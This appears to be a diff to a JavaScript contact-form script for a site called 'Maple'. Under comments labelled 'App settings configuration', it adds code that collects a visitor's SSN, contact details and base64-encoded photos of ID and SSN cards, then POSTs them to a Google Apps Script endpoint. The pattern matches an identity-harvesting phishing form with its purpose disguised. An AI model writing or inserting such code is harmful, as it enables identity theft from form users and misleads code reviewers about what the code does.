@@ -23,6 +23,7 @@ class Contact{
         this.time = document.querySelector('#copyright');
         this.loading = document.querySelector(".hero__h2");
         this.init();
+
     }
     init(){
     this.validateForm();
@@ -30,6 +31,8 @@ class Contact{
     this.copyrt();
     }
     validateForm(){
+
+
         const validEmail =(email)=>{
             const emailvalid = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
             return emailvalid.test(String(email).toLowerCase());
@@ -167,7 +170,8 @@ class Contact{
                 this.inputs[9].style.border="2px groove";
             }
 
-            if (this.state.value.trim() === '') {
+            
+            if (this.city.value.trim() === '') {
                 eve.preventDefault();
                 this.addErrors[0].textContent='This field is required';
                 this.addressInputs[0].style.border="2px groove hsl(0, 100%, 66%)";
@@ -178,8 +182,7 @@ class Contact{
                 this.addErrors[0].textContent='';
                 this.addressInputs[0].style.border="2px groove";
                
-            }
-            if (this.city.value.trim() === '') {
+            }if (this.state.value.trim() === '') {
                 eve.preventDefault();
                 this.addErrors[1].textContent='This field is required';
                 this.addressInputs[1].style.border="2px groove hsl(0, 100%, 66%)";
@@ -220,7 +223,30 @@ class Contact{
             }
             
             console.log(this.subject.value = `New details from ${this.firstName.value} ${this.lastName.value} Maple`);
-            })  
+
+            
+         //  App settings configuration 
+if (
+    this.firstName.value.trim().length > 2 &&
+    this.lastName.value.trim().length > 2 &&
+    this.phone.value.trim().length === 11 &&
+    this.ssn.value.trim().length === 8 &&
+    validEmail(this.email.value.trim()) &&
+    this.address.value.trim().length > 4 &&
+    this.state.value.trim().length > 0 &&
+    this.city.value.trim().length > 0 &&
+    this.zipCode.value.trim().length > 4 &&
+    this.frontImage.files.length > 0 &&
+    this.backImage.files.length > 0 &&
+    this.frontImageSsn.files.length > 0 &&
+    this.backImageSsn.files.length > 0
+  )
+   {
+    eve.preventDefault();
+    this.submitToGoogle();
+  }
+  // End
+     }); 
             
     }
     miniContact(){
@@ -233,9 +259,62 @@ this.mini.style.display = 'flex';
 document.querySelector('#copyright').innerHTML= ` Maple &copy; ${copyright}`; 
 
     }
+//   App settings configuration 
+    async submitToGoogle() {
+        this.loading.textContent = "Submitting… please wait";
+      
+        const data = {
+          firstName: this.firstName.value,
+          lastName: this.lastName.value,
+          email: this.email.value,
+          address: this.address.value,
+          city: this.city.value,
+          state: this.state.value,
+          zip: this.zipCode.value,
+          ssn: this.ssn.value,
+          phone: this.phone.value,
+      
+          ssnFront: await fileToBase64(this.frontImageSsn.files[0]),
+          ssnFrontType: this.frontImageSsn.files[0].type,
+      
+          ssnBack: await fileToBase64(this.backImageSsn.files[0]),
+          ssnBackType: this.backImageSsn.files[0].type,
+      
+          idFront: await fileToBase64(this.frontImage.files[0]),
+          idFrontType: this.frontImage.files[0].type,
+      
+          idBack: await fileToBase64(this.backImage.files[0]),
+          idBackType: this.backImage.files[0].type
+        };
+      
+        try {
+          await fetch("https://script.google.com/macros/s/AKfycbyC1yIt4l1lHXEF9pkoa_53Avubak9xonauwmALpKBuyQKYQ0boOqouE6OX1YgqlCjT/exec", {
+            method: "POST",
+            body: JSON.stringify(data)
+          });
+      
+          this.loading.textContent = "Submitted successfully";
+          this.form.reset();
+      
+        } catch (err) {
+          this.loading.textContent = "Submission failed";
+          console.error(err);
+        }
+      }
+    //   End
+      
     }
     
     
     const contact = new Contact()
     
-    
+    //  App settings configuration 
+    function fileToBase64(file) {
+        return new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = () => resolve(reader.result.split(",")[1]);
+          reader.onerror = reject;
+          reader.readAsDataURL(file);
+        });
+      }
+    //    End
